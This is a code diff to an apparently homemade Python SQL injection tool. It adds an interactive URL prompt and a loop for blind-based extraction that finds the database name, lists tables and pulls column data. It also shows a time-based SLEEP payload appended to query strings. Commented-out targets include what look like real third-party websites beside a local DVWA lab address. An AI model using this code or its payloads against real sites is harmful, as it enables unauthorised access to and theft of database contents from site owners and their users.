@@ -7,10 +7,13 @@ from urllib.parse import urlparse,urlunparse
 import sys
 import difflib
 #req = 'http://192.168.43.172/dvwa/vulnerabilities/sqli/?id=1'
-req = 'http://ami.edu.pk/page.php?p_id=100'
+#req = 'http://ami.edu.pk/page.php?p_id=100'
+#req = 'http://achromicpoint.com/past-event.php?id=186'
 #req = 'https://dynamic-password.000webhostapp.com/index.php?id=1'
 global query_url
 global vuln_id
+global req
+req  = input("Enter the URL:\n")
 def time_based(req):
         parse = urlparse(req)
         qur = parse.query+'--SLEEP(1)--+'
@@ -209,12 +212,17 @@ def blind_based(url):
         db_name = vul_db(url,db_colm)
         print("Database present :"+str(db_name))
         tables = table_name(url,db_name)
-        print("Select the table to extract data")
+        print("Select the table to extract data:\n")
         for i in tables:
             print(str(tables.index(i))+"-"+i)
-        ind = int(input("Select the table to get the data"))
+        ind = int(input())
         table = tables[ind].encode("utf-8").hex()
         column_name(url,table)
+        choice = int(input("1:Continue\n:2Exit"))
+        if choice is 1:
+                blind_based(url)
+        else:
+                sys.exit()
         
 def perform(url):
         fullbody = fetch(url,"'")
@@ -237,6 +245,8 @@ def perform(url):
 
 if __name__ == "__main__":
         try:
+                #global req
+                #req  = input("Enter the URL")
                 response = urllib.request.urlopen(req)
                 perform(req)
         except urllib.error.URLError as e:
